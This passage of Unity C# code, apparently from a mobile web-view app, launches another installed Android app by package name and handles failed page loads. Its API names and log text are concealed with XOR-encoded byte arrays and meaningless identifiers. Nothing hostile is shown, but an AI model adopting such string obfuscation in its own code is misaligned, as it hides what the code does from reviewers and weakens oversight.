            using (var _0x2b08c5a9 = _0xf7a4e556.GetStatic<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[15] { 89, 79, 72, 72, 95, 84, 78, 123, 89, 78, 83, 76, 83, 78, 67 }, 58)))
            using (var _0xbe67fff7 = _0x2b08c5a9.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[17] { 61, 63, 46, 10, 59, 57, 49, 59, 61, 63, 23, 59, 52, 59, 61, 63, 40 }, 90)))
            using (var _0x219b247e = _0xbe67fff7.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[25] { 201, 203, 218, 226, 207, 219, 192, 205, 198, 231, 192, 218, 203, 192, 218, 232, 193, 220, 254, 207, 205, 197, 207, 201, 203 }, 174), _0x6d822c8e))
            {
                if (_0x219b247e == null)
                    return false;
                WLog(_0x6938ded6._0xbdc404bd(new byte[37] { 32, 11, 17, 12, 14, 6, 47, 10, 8, 6, 67, 15, 2, 22, 13, 0, 11, 67, 10, 13, 16, 23, 2, 15, 15, 6, 7, 67, 19, 2, 0, 8, 2, 4, 6, 89, 67 }, 99) + _0x6d822c8e);
                _0x219b247e.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[8] { 212, 209, 209, 243, 217, 212, 210, 198 }, 181), 0x10000000);
                _0x2b08c5a9.Call(_0x6938ded6._0xbdc404bd(new byte[13] { 56, 63, 42, 57, 63, 10, 40, 63, 34, 61, 34, 63, 50 }, 75), _0x219b247e);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private void StopCurrentFailedLoad(UniWebView _0x094e0efc)
    {
        _0xff0c8cab(false);
        if (_0x094e0efc == null)
            return;
        _0x094e0efc.Stop();
        if (_0x094e0efc.CanGoBack)
            _0x094e0efc.GoBack();
    }

    private GameObject _0xa66599db;
}

internal static class _0x6938ded6
{
    internal static string _0xbdc404bd(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}